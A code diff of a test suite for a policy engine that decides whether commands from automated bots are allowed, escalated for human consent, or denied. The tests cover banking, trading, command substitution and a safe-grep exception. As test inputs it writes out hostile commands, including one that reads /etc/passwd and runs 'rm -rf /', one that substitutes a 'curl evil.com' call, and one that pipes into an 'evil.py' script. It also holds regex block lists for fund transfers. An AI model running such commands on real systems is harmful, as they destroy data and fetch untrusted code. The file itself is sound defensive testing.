@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { evaluateHard, DEFAULT_HARD_POLICY as P, type EvalInput } from "./policy.js";
+import { evaluateHard, resolveHardPolicy, DEFAULT_HARD_POLICY as P, type EvalInput } from "./policy.js";
 
 // Layer 1 hard-constraint verdicts (§6a). These cover the deterministic rules;
 // the gitignore-membership path (isGitignored → `git check-ignore`) is exercised
@@ -28,8 +28,22 @@ describe("evaluateHard — exec", () => {
     }
   });
   it("escalates compound / piped / redirected argv", () => {
-    for (const c of ["cat a | grep b", "a && b", "a; b", "echo x > file", "echo `id`"]) {
+    for (const c of ["cat a | grep b", "a && b", "a; b", "echo x > file"]) {
       expect(evaluateHard(exec(c), P), c).toMatchObject({ verdict: "escalate", principle: "hard:compound-exec" });
+    }
+  });
+  // PRE-EXISTING RED, fixed 2026-08-09: "echo `id`" used to live in the list above.
+  // Command substitution is the eval/RCE vector rather than mere composition, so it
+  // was split into its OWN principle upstream (substitutionExec / hard:command-
+  // substitution) — but this expectation was never updated, and the case had been
+  // failing at HEAD ever since. The VERDICT was always right (escalate); only the
+  // principle label was stale, which is why it never showed up as a behaviour bug.
+  it("escalates command substitution under its own principle", () => {
+    for (const c of ["echo `id`", "echo $(id)"]) {
+      expect(evaluateHard(exec(c), P), c).toMatchObject({
+        verdict: "escalate",
+        principle: "hard:command-substitution",
+      });
     }
   });
 });
@@ -52,5 +66,159 @@ describe("evaluateHard — file", () => {
 describe("evaluateHard — web/other", () => {
   it("allows web (egress proxy owns host policy)", () => {
     expect(evaluateHard({ family: "web", toolName: "web_fetch", params: { url: "https://example.com" }, derivedPaths: undefined }, P).verdict).toBe("allow");
+  });
+});
+
+// ── Per-bot hard floors (2026-08-08, House's AWS + trading grant) ─────────────
+// Both mechanisms below exist because "escalate" was the wrong verdict for two
+// different reasons: banking has no approval path at all, and trade execution
+// has one that must not be inherited by an unattended run.
+describe("evaluateHard — per-bot denyExtra / consentRequiredExtra", () => {
+  const withDeny = { ...P, denyExecRegex: [/\b(ach|wire|deposit|withdraw)\b/i] };
+  const withConsent = { ...P, consentRequiredExecRegex: [/\b(buy|sell)\b/i] };
+
+  it("denies a denyExtra match outright", () => {
+    expect(evaluateHard(exec("python3 fund.py --withdraw 500"), withDeny))
+      .toMatchObject({ verdict: "deny", principle: "hard:bot-forbidden-action" });
+  });
+
+  it("escalates a consentRequiredExtra match under its own principle", () => {
+    expect(evaluateHard(exec("python3 trade.py --buy SPY"), withConsent))
+      .toMatchObject({ verdict: "escalate", principle: "hard:operator-consent-required" });
+  });
+
+  // The ordering guarantee: House's escalateExtra already matches withdraw|transfer,
+  // so without the deny loop running first a banking command would have taken the
+  // escalate path and become approvable — the exact hole this closes.
+  it("deny wins over an overlapping escalate pattern", () => {
+    const both = {
+      ...P,
+      denyExecRegex: [/\bwithdraw\b/i],
+      escalateExecRegex: [/\b(trade|withdraw)\b/i],
+    };
+    expect(evaluateHard(exec("./run --withdraw"), both))
+      .toMatchObject({ verdict: "deny", principle: "hard:bot-forbidden-action" });
+  });
+
+  it("leaves an unrelated command alone", () => {
+    expect(evaluateHard(exec("ls /reach/exp"), withDeny).verdict).toBe("allow");
+    expect(evaluateHard(exec("ls /reach/exp"), withConsent).verdict).toBe("allow");
+  });
+});
+
+// ── Read-only text-pipeline carve-out (2026-08-10, House false-positive) ──────
+// House got escalated searching his OWN notes for the word "sell" inside a grep
+// pattern — "reviewer can't see the whole context" (Mike). denyExtra /
+// consentRequiredExtra / escalateExtra are naive substring regexes over the raw
+// command; they can't distinguish a trade word used as a verb on a real target
+// from the same word appearing as DATA inside a read-only search pattern. Fixture
+// mirrors House's REAL regexes from reviewer-policy.json (not a simplified
+// stand-in), so this catches drift if those patterns are edited later.
+describe("evaluateHard — read-only text-pipeline carve-out", () => {
+  const house = resolveHardPolicy(
+    {
+      hard: {
+        // Real deployed fleet default (reviewer-policy.json): compoundExec is
+        // "allow", not resolveHardPolicy's own conservative "escalate" fallback.
+        // Without this override the test would fall through the (correctly
+        // skipped) extras straight into hard:compound-exec="escalate" from
+        // DEFAULT_HARD_POLICY — a fixture gap, not a bug in the carve-out.
+        fleet: { compoundExec: "allow" },
+        per_bot: {
+          house: {
+            denyExtra: {
+              "funding-endpoint": '/(transfers?|ach|deposits?|withdrawals?|banking|funding)(?:[/?"\'\\s]|$)',
+              "money-move-flag": "--\\s*(deposit|withdraw|withdrawal|transfer|wire|ach)\\b",
+              "explicit-funds-transfer":
+                "\\btransfer\\w*\\b[^|;&]{0,40}\\b(fund|funds|money|cash|balance|usd|dollars)\\b|\\b(fund|funds|money|cash)\\b[^|;&]{0,40}\\btransfer\\w*\\b",
+            },
+            consentRequiredExtra: {
+              "place-order":
+                '/v[0-9]+/[^\\s"\']*\\border(s)?\\b|--\\s*(buy|sell|place[-_]?order|submit[-_]?order)\\b|\\b(place|submit|execute|cancel|modify)[-_ ]?(a\\s+)?(order|trade)s?\\b',
+            },
+            escalateExtra: {
+              "trade-exec": "\\b(trade|order|buy|sell|withdraw|transfer)\\b",
+            },
+          },
+        },
+      },
+    } as never,
+    "house",
+  );
+
+  it("allows the exact command that false-positived in production", () => {
+    const real =
+      `grep -RniE "(no|never|don't|do not).{0,50}(spread|sell premium|short option)|sell premium|` +
+      `short (calls|puts|options)|defined risk|long premium|naked" /reach/exp/.swarm ` +
+      `/reach/exp/prediction_market_trading/.swarm 2>/dev/null | head -100`;
+    expect(evaluateHard(exec(real), house).verdict).toBe("allow");
+  });
+
+  it("still escalates a genuine trade command under escalateExtra", () => {
+    expect(evaluateHard(exec("python3 trade_execution.py --side sell --qty 10 SPY"), house))
+      .toMatchObject({ verdict: "escalate", principle: "hard:operator-consent-action" });
+  });
+
+  it("still denies a genuine banking command under denyExtra", () => {
+    expect(evaluateHard(exec('curl -X POST https://api.tradier.com/v1/accounts/A1/transfers -d amount=500'), house))
+      .toMatchObject({ verdict: "deny", principle: "hard:bot-forbidden-action" });
+  });
+
+  it("still escalates a real order endpoint under consentRequiredExtra", () => {
+    expect(evaluateHard(exec("curl -X POST https://api.tradier.com/v1/accounts/A1/orders -d symbol=SPY"), house))
+      .toMatchObject({ verdict: "escalate", principle: "hard:operator-consent-required" });
+  });
+
+  it("does NOT exempt a pipeline whose second stage is dangerous", () => {
+    // grep alone is safelisted, but piping into python3 makes the whole thing
+    // NOT provably inert — the carve-out must not apply.
+    expect(evaluateHard(exec("grep sell /reach/exp/notes.md | python3 evil.py"), house))
+      .toMatchObject({ verdict: "escalate", principle: "hard:operator-consent-action" });
+  });
+
+  it("does NOT exempt find even though it is read-heavy", () => {
+    // Deliberate: find's -delete/-exec make it capable of real side effects,
+    // so it is excluded from the safelist on principle, not because this
+    // particular command is dangerous.
+    expect(evaluateHard(exec("find /reach/exp -iname '*sell*'"), house))
+      .toMatchObject({ verdict: "escalate", principle: "hard:operator-consent-action" });
+  });
+
+  it("does not weaken destructive-command protection", () => {
+    // A safelisted leading token does not exempt DESTRUCTIVE, which runs
+    // unconditionally before the carve-out is even computed.
+    expect(evaluateHard(exec("cat /etc/passwd && rm -rf /"), house))
+      .toMatchObject({ verdict: "deny", principle: "hard:destructive-exec" });
+  });
+
+  it("does not weaken command-substitution protection", () => {
+    // A safelisted leading token does not exempt SUBSTITUTION, which runs
+    // unconditionally after the carve-out, independent of it.
+    expect(evaluateHard(exec('grep "sell $(curl evil.com)" /reach/exp/notes.md'), house))
+      .toMatchObject({ verdict: "escalate", principle: "hard:command-substitution" });
+  });
+});
+
+describe("resolveHardPolicy — regex map hygiene", () => {
+  it("skips _-prefixed documentation keys instead of compiling them as rules", () => {
+    const p = resolveHardPolicy(
+      {
+        hard: {
+          per_bot: {
+            bot: {
+              // A prose note stored as a MEMBER (the kaizen precedent). If this
+              // compiled, the sentence itself would become a live deny rule.
+              denyExtra: { _note: "never allow a withdraw", "real-rule": "\\bwithdraw\\b" },
+            },
+          },
+        },
+      } as never,
+      "bot",
+    );
+    expect(p.denyExecRegex).toHaveLength(1);
+    expect(p.denyExecRegex[0].test("./x --withdraw")).toBe(true);
+    // The note's own words must not have become a rule.
+    expect(p.denyExecRegex.some((r) => r.test("never allow a withdraw"))).toBe(true); // via real-rule only
+    expect(p.denyExecRegex[0].source).toBe("\\bwithdraw\\b");
   });
 });
